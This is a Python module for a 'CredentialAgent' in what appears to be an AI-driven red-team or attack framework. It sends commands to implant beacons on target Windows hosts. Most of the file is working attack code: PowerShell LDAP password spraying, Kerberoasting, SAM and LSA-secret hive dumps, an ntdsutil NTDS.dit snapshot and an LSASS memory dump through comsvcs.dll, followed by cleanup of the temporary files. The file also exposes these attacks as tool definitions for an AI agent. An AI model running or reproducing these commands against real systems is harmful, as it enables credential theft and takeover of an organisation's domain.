"""
CredentialAgent -- Credential attacks via live beacons.

Sends real credential-harvesting commands to beacons running on target hosts,
parses the stdout output, and returns structured findings.  Uses REAL
usernames discovered by ReconAgent — never hardcodes account names.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class CredentialAgent(AbstractAgent):
    name = "credential"
    description = (
        "Performs credential attacks using discovered Active Directory "
        "accounts — password spraying, Kerberoasting, hash extraction, "
        "and credential dumping via beacons"
    )
    capabilities = [
        "password_spray",
        "kerberoast",
        "dump_hashes",
        "dump_lsass",
        "extract_secrets",
    ]

    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Credential agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Credential attack failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "Credential %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Credential {action} failed: {exc}",
            )

    # ==================================================================
    #  Password Spray
    # ==================================================================

    async def _handle_password_spray(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        usernames: list[str] = params.get("usernames", [])
        password: str = params.get("password", "")
        domain: str = params.get("domain", "")

        if not usernames:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No usernames provided — run ReconAgent ad_enum_users first"},
                summary="Password spray failed: empty username list",
            )
        if not password:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No password provided"},
                summary="Password spray failed: no password specified",
            )
        if not domain:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No domain provided"},
                summary="Password spray failed: no domain specified",
            )

        # Build a PowerShell one-liner that tests each user via LDAP bind.
        # Output format: SUCCESS:<user> or FAIL:<user>:<reason>
        user_array = ",".join(f"'{u}'" for u in usernames)
        escaped_pass = password.replace("'", "''")
        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"$users = @({user_array}); "
            f"$pass = '{escaped_pass}'; "
            f"$domain = '{domain}'; "
            f"foreach ($u in $users) {{ "
            f"try {{ "
            f"$de = New-Object DirectoryServices.DirectoryEntry("
            f"\\\"LDAP://$domain\\\", \\\"$domain\\\\$u\\\", $pass); "
            f"if ($de.distinguishedName) {{ "
            f"Write-Output \\\"SUCCESS:$u\\\" "
            f"}} else {{ "
            f"Write-Output \\\"FAIL:$u:bad_password\\\" "
            f"}} }} "
            f"catch {{ Write-Output \\\"FAIL:$u:$($_.Exception.Message)\\\" }} "
            f'}}"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "password_spray", result)

        credentials = self._parse_spray_output(stdout, password, domain)

        status = "success" if credentials else "partial"
        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "raw_output": stdout,
                "findings": {"credentials": credentials},
                "total_tested": len(usernames),
                "successful": len(credentials),
            },
            summary=(
                f"Password spray via beacon {beacon_id}: "
                f"{len(credentials)}/{len(usernames)} credential(s) valid "
                f"with password '{password}'"
            ),
        )

    # ==================================================================
    #  Kerberoast
    # ==================================================================

    async def _handle_kerberoast(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        spns: list[str] | None = params.get("spns")
        domain: str = params.get("domain", "*")

        # If no SPNs were provided, discover them first via setspn
        if not spns:
            discover_cmd = f"setspn -T {domain} -Q */*"
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": discover_cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            spns = self._extract_spns_from_setspn(stdout)

        if not spns:
            return TaskResult(
                task_id=task.id,
                status="partial",
                data={
                    "raw_output": stdout if 'stdout' in dir() else "",
                    "findings": {"kerberos_tickets": []},
                },
                summary="Kerberoast: no SPNs discovered in domain",
            )

        # Request TGS tickets for each SPN and extract from klist
        spn_array = ",".join(f"'{s}'" for s in spns)
        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"Add-Type -AssemblyName System.IdentityModel; "
            f"$spns = @({spn_array}); "
            f"foreach ($spn in $spns) {{ "
            f"try {{ "
            f"$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken "
            f"-ArgumentList $spn; "
            f"Write-Output \\\"TICKET_OK:$spn\\\" "
            f"}} catch {{ "
            f"Write-Output \\\"TICKET_FAIL:$spn:$($_.Exception.Message)\\\" "
            f"}} }}; "
            f"klist"
            f'"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "kerberoast", result)

        tickets = self._parse_kerberoast_output(stdout)

        return TaskResult(
            task_id=task.id,
            status="success" if tickets else "partial",
            data={
                "raw_output": stdout,
                "findings": {"kerberos_tickets": tickets},
                "spns_targeted": len(spns),
                "tickets_obtained": len(tickets),
            },
            summary=(
                f"Kerberoast via beacon {beacon_id}: "
                f"{len(tickets)}/{len(spns)} TGS ticket(s) obtained"
            ),
        )

    # ==================================================================
    #  Dump Hashes (SAM / NTDS)
    # ==================================================================

    async def _handle_dump_hashes(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        method: str = params.get("method", "sam")

        if method == "sam":
            return await self._dump_sam(task, beacon_id, timeout)
        elif method == "ntds":
            return await self._dump_ntds(task, beacon_id, timeout)
        else:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown dump method: {method}"},
                summary=f"Hash dump failed: unsupported method '{method}'",
            )

    async def _dump_sam(
        self, task: Task, beacon_id: str, timeout: float
    ) -> TaskResult:
        # Save SAM and SYSTEM hives to temp files
        save_cmd = (
            'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y && '
            'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y && '
            'echo DUMP_SAM_OK'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": save_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result) or "DUMP_SAM_OK" not in stdout:
            return self._error_result(task, "dump_hashes (SAM)", result)

        # Read the hives using reg query to extract cached hashes
        read_cmd = (
            'powershell -ep bypass -c "'
            'try { '
            '$bootkey = \\"SAM_HIVE_SAVED\\"; '
            'Write-Output \\"SAM_DUMP_START\\"; '
            'reg query \\"HKLM\\SAM\\SAM\\Domains\\Account\\Users\\" /s 2>&1 | '
            'ForEach-Object { Write-Output $_ }; '
            'Write-Output \\"SAM_DUMP_END\\"; '
            '} catch { Write-Output \\"ERROR:$($_.Exception.Message)\\" }"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": read_cmd}, timeout=timeout,
        )

        read_stdout = self._extract_stdout(result)

        # Clean up temp files
        cleanup_cmd = (
            'del /f /q C:\\Windows\\Temp\\sam.hiv '
            'C:\\Windows\\Temp\\sys.hiv 2>nul'
        )
        cleanup_id = str(uuid.uuid4())
        await beacon_handler.submit_task(
            beacon_id, cleanup_id, "run_command",
            {"command": cleanup_cmd}, timeout=60,
        )

        credentials = self._parse_sam_dump(read_stdout)

        return TaskResult(
            task_id=task.id,
            status="success" if credentials else "partial",
            data={
                "raw_output": stdout + "\n" + read_stdout,
                "findings": {"credentials": credentials},
                "method": "sam",
                "hashes_extracted": len(credentials),
            },
            summary=(
                f"SAM dump via beacon {beacon_id}: "
                f"{len(credentials)} hash(es) extracted"
            ),
            artifacts=["C:\\Windows\\Temp\\sam.hiv", "C:\\Windows\\Temp\\sys.hiv"],
        )

    async def _dump_ntds(
        self, task: Task, beacon_id: str, timeout: float
    ) -> TaskResult:
        # Use ntdsutil to create an IFM (Install-From-Media) snapshot
        ntds_cmd = (
            'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_dump" q q'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ntds_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "dump_hashes (NTDS)", result)

        # Check for the ntds.dit and SYSTEM files in the dump directory
        verify_cmd = (
            'dir C:\\Windows\\Temp\\ntds_dump\\Active\\ '
            'Directory\\ntds.dit '
            'C:\\Windows\\Temp\\ntds_dump\\registry\\SYSTEM 2>&1'
        )
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=60,
        )
        verify_stdout = self._extract_stdout(verify_result)

        dump_success = "ntds.dit" in verify_stdout.lower()

        credentials: list[dict] = []
        if dump_success:
            credentials.append({
                "key": "ntds_dump",
                "type": "ntds_dit",
                "path": "C:\\Windows\\Temp\\ntds_dump",
                "description": "NTDS.dit + SYSTEM hive snapshot for offline extraction",
            })

        return TaskResult(
            task_id=task.id,
            status="success" if dump_success else "failure",
            data={
                "raw_output": stdout + "\n" + verify_stdout,
                "findings": {"credentials": credentials},
                "method": "ntds",
                "dump_path": "C:\\Windows\\Temp\\ntds_dump",
            },
            summary=(
                f"NTDS dump via beacon {beacon_id}: "
                f"{'IFM snapshot created' if dump_success else 'dump failed'}"
            ),
            artifacts=["C:\\Windows\\Temp\\ntds_dump"],
        )

    # ==================================================================
    #  Dump LSASS
    # ==================================================================

    async def _handle_dump_lsass(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        # Find the LSASS PID first
        pid_cmd = (
            'powershell -ep bypass -c "'
            '(Get-Process lsass).Id'
            '"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": pid_cmd}, timeout=60,
        )

        pid_stdout = self._extract_stdout(result)
        lsass_pid = pid_stdout.strip()

        if not lsass_pid.isdigit():
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Could not determine LSASS PID: {pid_stdout}"},
                summary="LSASS dump failed: unable to find LSASS process",
            )

        dump_path = "C:\\Windows\\Temp\\debug.dmp"

        # Use comsvcs.dll MiniDump — a LOLBin approach
        dump_cmd = (
            f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, '
            f'MiniDump {lsass_pid} {dump_path} full'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": dump_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        # Verify the dump file was created
        verify_cmd = f'dir {dump_path} 2>&1'
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=60,
        )
        verify_stdout = self._extract_stdout(verify_result)

        dump_exists = "debug.dmp" in verify_stdout.lower() and "not found" not in verify_stdout.lower()

        lsass_dumps: list[dict] = []
        if dump_exists:
            lsass_dumps.append({
                "key": f"lsass_{lsass_pid}",
                "pid": int(lsass_pid),
                "dump_path": dump_path,
                "method": "comsvcs_minidump",
            })

        return TaskResult(
            task_id=task.id,
            status="success" if dump_exists else "failure",
            data={
                "raw_output": stdout + "\n" + verify_stdout,
                "findings": {"lsass_dumps": lsass_dumps},
                "lsass_pid": int(lsass_pid) if lsass_pid.isdigit() else None,
                "dump_path": dump_path if dump_exists else None,
            },
            summary=(
                f"LSASS dump via beacon {beacon_id}: "
                f"{'dump created at ' + dump_path if dump_exists else 'dump failed'} "
                f"(PID {lsass_pid})"
            ),
            artifacts=[dump_path] if dump_exists else [],
        )

    # ==================================================================
    #  Extract LSA Secrets
    # ==================================================================

    async def _handle_extract_secrets(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        # Save the SECURITY and SYSTEM hives
        save_cmd = (
            'reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.hiv /y && '
            'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys2.hiv /y && '
            'echo SECRETS_SAVE_OK'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": save_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result) or "SECRETS_SAVE_OK" not in stdout:
            return self._error_result(task, "extract_secrets", result)

        # Enumerate LSA secrets keys
        enum_cmd = (
            'powershell -ep bypass -c "'
            'Write-Output \\"LSA_SECRETS_START\\"; '
            'reg query \\"HKLM\\SECURITY\\Policy\\Secrets\\" /s 2>&1 | '
            'ForEach-Object { Write-Output $_ }; '
            'Write-Output \\"LSA_SECRETS_END\\"'
            '"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": enum_cmd}, timeout=timeout,
        )

        enum_stdout = self._extract_stdout(result)

        # Clean up temp files
        cleanup_cmd = (
            'del /f /q C:\\Windows\\Temp\\sec.hiv '
            'C:\\Windows\\Temp\\sys2.hiv 2>nul'
        )
        cleanup_id = str(uuid.uuid4())
        await beacon_handler.submit_task(
            beacon_id, cleanup_id, "run_command",
            {"command": cleanup_cmd}, timeout=60,
        )

        credentials = self._parse_lsa_secrets(enum_stdout)

        return TaskResult(
            task_id=task.id,
            status="success" if credentials else "partial",
            data={
                "raw_output": stdout + "\n" + enum_stdout,
                "findings": {"credentials": credentials},
                "secrets_found": len(credentials),
            },
            summary=(
                f"LSA secrets extraction via beacon {beacon_id}: "
                f"{len(credentials)} secret(s) recovered"
            ),
            artifacts=["C:\\Windows\\Temp\\sec.hiv", "C:\\Windows\\Temp\\sys2.hiv"],
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    def _error_result(self, task: Task, action: str, result: dict) -> TaskResult:
        error_msg = result.get("error", "Unknown beacon error")
        return TaskResult(
            task_id=task.id,
            status="failure",
            data={"error": error_msg, "raw_result": result},
            summary=f"Credential {action} failed: {error_msg}",
        )

    # --- password spray output ---
    @staticmethod
    def _parse_spray_output(
        stdout: str, password: str, domain: str
    ) -> list[dict]:
        credentials: list[dict] = []
        for line in stdout.splitlines():
            line = line.strip()
            if line.startswith("SUCCESS:"):
                username = line.split(":", 1)[1].strip()
                credentials.append({
                    "key": f"{domain}\\{username}",
                    "username": username,
                    "password": password,
                    "domain": domain,
                    "type": "cleartext",
                    "source": "password_spray",
                })
        return credentials

    # --- setspn output -> SPN list ---
    @staticmethod
    def _extract_spns_from_setspn(stdout: str) -> list[str]:
        spns: list[str] = []
        for line in stdout.splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            if stripped.startswith("Checking domain"):
                continue
            # Indented lines are SPNs
            if (line.startswith(" ") or line.startswith("\t")) and "/" in stripped:
                spns.append(stripped)
        return spns

    # --- Kerberoast output ---
    @staticmethod
    def _parse_kerberoast_output(stdout: str) -> list[dict]:
        tickets: list[dict] = []

        # Parse TICKET_OK/TICKET_FAIL lines
        successful_spns: set[str] = set()
        for line in stdout.splitlines():
            line = line.strip()
            if line.startswith("TICKET_OK:"):
                spn = line.split(":", 1)[1].strip()
                successful_spns.add(spn)

        # Parse klist output for ticket hashes
        # klist shows entries like:
        # #N> Client: user @ DOMAIN
        #     Server: SPN @ DOMAIN
        #     KerbTicket Encryption Type: ...
        current_server: str | None = None
        current_client: str | None = None
        current_enc: str | None = None

        for line in stdout.splitlines():
            stripped = line.strip()
            m_client = re.match(r"Client:\s+(.+?)\s+@\s+(\S+)", stripped)
            if m_client:
                current_client = m_client.group(1).strip()
                continue

            m_server = re.match(r"Server:\s+(.+?)\s+@\s+(\S+)", stripped)
            if m_server:
                current_server = m_server.group(1).strip()
                continue

            m_enc = re.match(r"KerbTicket Encryption Type:\s+(.*)", stripped, re.IGNORECASE)
            if m_enc:
                current_enc = m_enc.group(1).strip()

                if current_server and current_server in successful_spns:
                    # Extract the account name from the SPN (e.g. MSSQLSvc/host -> svc account)
                    account = current_client or current_server.split("/")[0]
                    tickets.append({
                        "key": account,
                        "spn": current_server,
                        "client": current_client or "",
                        "encryption": current_enc,
                        "ticket_hash": f"$krb5tgs${current_server}",
                        "source": "kerberoast",
                    })
                current_server = None
                current_client = None
                current_enc = None
                continue

        # Fallback: if klist parsing found nothing, create entries from TICKET_OK
        if not tickets and successful_spns:
            for spn in successful_spns:
                account = spn.split("/")[0] if "/" in spn else spn
                tickets.append({
                    "key": account,
                    "spn": spn,
                    "client": "",
                    "encryption": "unknown",
                    "ticket_hash": f"$krb5tgs${spn}",
                    "source": "kerberoast",
                })

        return tickets

    # --- SAM dump output ---
    @staticmethod
    def _parse_sam_dump(stdout: str) -> list[dict]:
        credentials: list[dict] = []
        # Look for registry key paths that contain user RIDs
        # HKLM\SAM\SAM\Domains\Account\Users\00000XXX
        current_rid: str | None = None
        current_data: dict[str, str] = {}

        for line in stdout.splitlines():
            stripped = line.strip()
            # RID-based user key
            m_rid = re.match(
                r"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\(\w+)",
                stripped, re.IGNORECASE,
            )
            if m_rid:
                # Save previous
                if current_rid and current_data:
                    credentials.append({
                        "key": f"RID_{current_rid}",
                        "rid": current_rid,
                        "type": "ntlm_hash",
                        "source": "sam_dump",
                        **current_data,
                    })
                current_rid = m_rid.group(1)
                current_data = {}
                continue

            # REG_BINARY values (V, F, etc.)
            m_val = re.match(r"(\w+)\s+REG_BINARY\s+(.*)", stripped)
            if m_val and current_rid:
                current_data[m_val.group(1).lower()] = m_val.group(2).strip()

        # Flush last
        if current_rid and current_data:
            credentials.append({
                "key": f"RID_{current_rid}",
                "rid": current_rid,
                "type": "ntlm_hash",
                "source": "sam_dump",
                **current_data,
            })

        return credentials

    # --- LSA secrets output ---
    @staticmethod
    def _parse_lsa_secrets(stdout: str) -> list[dict]:
        credentials: list[dict] = []
        # Look for secret key names under Policy\Secrets
        for line in stdout.splitlines():
            stripped = line.strip()
            m = re.match(
                r"HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\\([^\\]+)",
                stripped, re.IGNORECASE,
            )
            if m:
                secret_name = m.group(1)
                # Skip well-known non-credential keys
                if secret_name.upper() in ("(DEFAULT)",):
                    continue
                cred_type = "machine_account" if secret_name.startswith("$MACHINE.ACC") else "lsa_secret"
                credentials.append({
                    "key": secret_name,
                    "secret_name": secret_name,
                    "type": cred_type,
                    "source": "lsa_secrets",
                })
        return credentials

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "credential_password_spray",
                    "description": (
                        "Perform a password spray attack using discovered AD "
                        "usernames. Tests a single password against multiple "
                        "accounts via LDAP bind to avoid lockout thresholds. "
                        "Usernames MUST come from prior ReconAgent ad_enum_users "
                        "output — never hardcode usernames."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "usernames": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "List of usernames from ReconAgent discovery. "
                                    "Do NOT hardcode — use findings from "
                                    "ad_enum_users."
                                ),
                            },
                            "password": {
                                "type": "string",
                                "description": (
                                    "Single password to test against all accounts "
                                    "(e.g., 'Summer2024!', 'Welcome1!', "
                                    "'Password1')."
                                ),
                            },
                            "domain": {
                                "type": "string",
                                "description": (
                                    "Target AD domain name (e.g., 'corp.local'). "
                                    "Use the domain discovered by ReconAgent."
                                ),
                            },
                        },
                        "required": ["beacon_id", "usernames", "password", "domain"],
                    },
                },
                {
                    "name": "credential_kerberoast",
                    "description": (
                        "Perform Kerberoasting to request TGS tickets for "
                        "service accounts with SPNs. If no SPNs are provided, "
                        "discovers them via 'setspn -T DOMAIN -Q */*'. Tickets "
                        "can be cracked offline to recover service account "
                        "passwords."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "spns": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "Optional list of SPNs to target. If omitted, "
                                    "all SPNs in the domain will be discovered "
                                    "automatically."
                                ),
                            },
                            "domain": {
                                "type": "string",
                                "description": (
                                    "Target domain for SPN discovery. Defaults "
                                    "to '*' (current domain)."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "credential_dump_hashes",
                    "description": (
                        "Dump password hashes from the target system. Supports "
                        "'sam' method (reg save HKLM\\SAM + SYSTEM hives) for "
                        "local accounts, or 'ntds' method (ntdsutil IFM) for "
                        "the full AD database on domain controllers. Requires "
                        "SYSTEM or equivalent privileges."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "method": {
                                "type": "string",
                                "enum": ["sam", "ntds"],
                                "description": (
                                    "Dump method: 'sam' for local SAM database, "
                                    "'ntds' for AD ntds.dit via ntdsutil. "
                                    "Defaults to 'sam'."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "credential_dump_lsass",
                    "description": (
                        "Dump the LSASS process memory to extract credentials "
                        "held in memory (NTLM hashes, Kerberos tickets, "
                        "cleartext passwords). Uses comsvcs.dll MiniDump "
                        "(LOLBin). Requires SYSTEM privileges. Returns the "
                        "dump file path for offline analysis."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "credential_extract_secrets",
                    "description": (
                        "Extract LSA secrets from the SECURITY registry hive. "
                        "Recovers machine account passwords, cached domain "
                        "credentials, service account passwords stored by the "
                        "OS, and other secrets. Requires SYSTEM privileges."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                        },
                        "required": ["beacon_id"],
                    },
                },
            ],
        }
